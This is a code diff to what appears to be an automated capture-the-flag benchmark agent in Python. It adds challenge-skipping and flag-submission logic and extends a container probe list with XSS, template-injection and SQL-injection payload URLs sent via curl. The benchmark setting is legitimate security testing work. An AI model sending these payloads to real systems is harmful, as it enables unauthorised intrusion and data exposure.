@@ -896,6 +896,20 @@ class FourPillarPipeline:
         )
         return candidates[0] if candidates else None
 
+    def _benchmark_mark_abandoned(self, code: str, reason: str) -> None:
+        if not code:
+            return
+        with self._benchmark_state_lock:
+            abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
+            abandoned.add(code)
+            self._benchmark_state["abandoned_challenges"] = abandoned
+        self._record_trace(
+            "benchmark_challenge_abandoned",
+            detail=f"{code} 已加入本轮跳过列表：{reason}",
+            metadata={"challenge": code, "reason": reason},
+        )
+        self._persist_benchmark_state()
+
     def _benchmark_active_challenge_from_state(self) -> tuple[str | None, list[str]]:
         with self._benchmark_state_lock:
             completed = set(self._benchmark_state.get("completed_challenges", set()))
@@ -922,6 +936,13 @@ class FourPillarPipeline:
             method="POST",
             path=f"/openapi/v1/challenges/start?unique_code={code}",
         )
+        lowered = stdout.lower()
+        if (
+            "resource_unavailable" in lowered
+            or "resource_agent" in lowered
+            or "http 502" in lowered
+        ):
+            self._benchmark_mark_abandoned(code, "start 返回资源不可用")
         return stdout
 
     def _benchmark_probe_container_local(self, code: str, addrs: list[str]) -> str:
@@ -942,6 +963,14 @@ class FourPillarPipeline:
             f"http://{addr}/api/flag",
             f"http://{addr}/.git/config",
             f"http://{addr}/backup.zip",
+            f"http://{addr}/page?name=x%22;alert(%22XSS%22)%3Bfoo=%22",
+            f"http://{addr}/?name=x%22;alert(%22XSS%22)%3Bfoo=%22",
+            f"http://{addr}/?name={{{{7*7}}}}",
+            f"http://{addr}/page?name={{{{7*7}}}}",
+            f"http://{addr}/search?q=%27%20OR%20%271%27%3D%271",
+            f"http://{addr}/?id=1%20OR%201=1",
+            f"http://{addr}/user?id=1",
+            f"http://{addr}/api/user?id=1",
         ]
         outputs: list[str] = []
         for url in urls:
@@ -951,9 +980,9 @@ class FourPillarPipeline:
                 "--interface",
                 "tun0",
                 "--connect-timeout",
-                "3",
+                "2",
                 "--max-time",
-                "6",
+                "4",
                 "-i",
                 url,
             ]
@@ -964,7 +993,7 @@ class FourPillarPipeline:
                     text=True,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
-                    timeout=8,
+                    timeout=6,
                 )
             except Exception as exc:
                 outputs.append(f"## {url}\nERROR: {exc}")
@@ -1049,16 +1078,30 @@ class FourPillarPipeline:
             )
         return None
 
-    def _benchmark_active_submit_code(self) -> str | None:
+    def _benchmark_active_submit_code(self, evidence: str = "") -> str | None:
         with self._benchmark_state_lock:
             completed = set(self._benchmark_state.get("completed_challenges", set()))
             closed = set(self._benchmark_state.get("closed_challenges", set()))
-            abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
             active = dict(self._benchmark_state.get("active_containers", {}))
             current = self._benchmark_state.get("current_challenge")
-        excluded = completed | closed | abandoned
+        excluded = completed | closed
         if isinstance(current, str) and current and current not in excluded:
             return current
+        if evidence:
+            matched_codes: list[str] = []
+            for code, addrs in active.items():
+                if not isinstance(code, str) or code in excluded:
+                    continue
+                for addr in addrs or []:
+                    if not isinstance(addr, str) or not addr:
+                        continue
+                    host = addr.split(":", 1)[0]
+                    if addr in evidence or f"http://{addr}" in evidence or host in evidence:
+                        matched_codes.append(code)
+                        break
+            matched_codes = list(dict.fromkeys(matched_codes))
+            if len(matched_codes) == 1:
+                return matched_codes[0]
         active_candidates = [
             code for code in active
             if isinstance(code, str) and code not in excluded
@@ -1093,7 +1136,7 @@ class FourPillarPipeline:
         )
         if not flags:
             return
-        code = self._benchmark_active_submit_code()
+        code = self._benchmark_active_submit_code(f"{command}\n{output}")
         if not code:
             self._record_trace(
                 "benchmark_auto_submit_skipped",
@@ -3543,23 +3586,41 @@ class FourPillarPipeline:
                 self._record_trace("subtask_start", detail=f"[{role_str}] {desc[:200]}")
 
                 deterministic_result: str | None = None
-                if "Benchmark fast step 1" in desc:
+                deterministic_step = ""
+                score_status = self._benchmark_score_status()
+                should_run_deterministic = "Benchmark fast step 1" in desc or (
+                    "Benchmark fast step 2" in desc
+                    and (
+                        bool(score_status.get("rush_mode"))
+                        or bool(score_status.get("gap_mode"))
+                    )
+                )
+                if should_run_deterministic:
+                    deterministic_step = (
+                        "step2"
+                        if "Benchmark fast step 2" in desc
+                        else "step1"
+                    )
                     try:
                         deterministic_result = self._benchmark_deterministic_fast_step(
                             desc,
-                            reason="deterministic_scheduler",
+                            reason=(
+                                "rush_or_gap_mode"
+                                if deterministic_step == "step2"
+                                else "deterministic_scheduler"
+                            ),
                         )
                     except Exception as exc:
                         self._record_trace(
                             "benchmark_deterministic_fast_failed",
                             detail=str(exc),
-                            metadata={"step": "step1"},
+                            metadata={"step": deterministic_step},
                         )
                         deterministic_result = None
                 if deterministic_result is not None:
                     elapsed = (time_mod.monotonic() - start) * 1000
                     renderer.console.print(
-                        f"  [dim green]✓ 确定性调度完成[/] [dim]({elapsed:.0f}ms)[/]"
+                        f"  [dim green]✓ 确定性 fast step 完成[/] [dim]({elapsed:.0f}ms)[/]"
                     )
                     self._print_subtask_status(
                         idx,
@@ -3571,7 +3632,10 @@ class FourPillarPipeline:
                     self._record_trace(
                         "benchmark_deterministic_fast_step",
                         detail=deterministic_result[:1000],
-                        metadata={"step": "step1"},
+                        metadata={
+                            "step": deterministic_step,
+                            "score_status": score_status,
+                        },
                     )
                     round_results.append(f"## [{role_str}] {desc}\n{deterministic_result}")
                     self._consecutive_failures = 0
@@ -3631,6 +3695,35 @@ class FourPillarPipeline:
                         round_results.append(f"## [{role_str}] {desc}\n❌ {setup_stop_reason}")
                         circuit_broken = True
                         break
+                    fallback_result = None
+                    if "Benchmark fast step 2" in desc:
+                        try:
+                            fallback_result = self._benchmark_deterministic_fast_step(
+                                desc,
+                                reason=f"timeout:{str(exc)[:160]}",
+                            )
+                        except Exception as fallback_exc:
+                            self._record_trace(
+                                "benchmark_deterministic_fast_failed",
+                                detail=str(fallback_exc),
+                                metadata={
+                                    "step": "step2_timeout",
+                                    "original_error": str(exc)[:300],
+                                },
+                            )
+                    if fallback_result is not None:
+                        self._record_trace(
+                            "benchmark_deterministic_fast_step",
+                            detail=fallback_result[:1000],
+                            metadata={
+                                "reason": "subtask_timeout",
+                                "original_error": str(exc)[:300],
+                            },
+                        )
+                        round_results.append(f"## [{role_str}] {desc}\n{fallback_result}")
+                        self._consecutive_failures = 0
+                        self._benchmark_reset_setup_timeout_streak()
+                        continue
                     timeout_directive = self._benchmark_timeout_directive(str(exc))
                     if timeout_directive:
                         self._benchmark_forced_directive = timeout_directive
